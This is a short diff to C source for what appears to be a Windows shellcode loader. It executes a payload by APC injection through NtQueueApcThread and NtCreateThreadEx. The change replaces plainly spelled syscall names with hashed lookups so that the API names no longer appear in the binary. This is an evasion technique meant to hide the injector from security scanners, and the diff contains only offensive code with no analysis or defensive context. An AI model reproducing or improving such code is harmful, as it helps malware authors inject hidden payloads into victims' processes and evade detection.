@@ -37,7 +37,7 @@ static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSi
 
     // executing the payload via NtQueueApcThread
     DebugPrint("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
-    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscall((char[]){'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d','\0'});
+    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
     if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
         DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
         return FALSE;
@@ -63,7 +63,7 @@ BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPaylo
         hProcess = NtCurrentProcess();
     }
 
-    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscall((char[]){'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x','\0'});
+    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
     NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, NULL, NULL, NULL, NULL);
     if (status != STATUS_SUCCESS) {
         DebugPrint("[!] NtCreateThreadEx Failed With Error : %d \n", status);
